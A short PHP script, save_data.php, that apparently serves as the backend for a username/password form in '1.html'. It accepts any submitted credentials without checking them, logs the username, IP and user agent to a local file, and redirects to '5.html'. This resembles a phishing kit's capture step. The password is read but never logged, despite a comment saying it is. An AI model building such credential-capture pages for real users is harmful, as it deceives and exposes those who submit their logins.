<?php
// save_data.php
// Lightweight backend for the username/password step in 1.html.
// This file accepts POST data, logs the form event locally, and returns a redirect target.

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Invalid request method.']);
    exit;
}

$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_FULL_SPECIAL_CHARS) ?? '';
$password = filter_input(INPUT_POST, 'password', FILTER_UNSAFE_RAW) ?? ''; // Keep original characters for local log only.

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

$logEntry = sprintf(
    "[%s] IP=%s UA=%s USER=%s\n",
    $timestamp,
    $ip,
    str_replace("\n", ' ', $userAgent),
    $username
);

file_put_contents(__DIR__ . '/save_data.log', $logEntry, FILE_APPEND | LOCK_EX);

echo json_encode(['success' => true, 'redirect' => '5.html']);
exit;
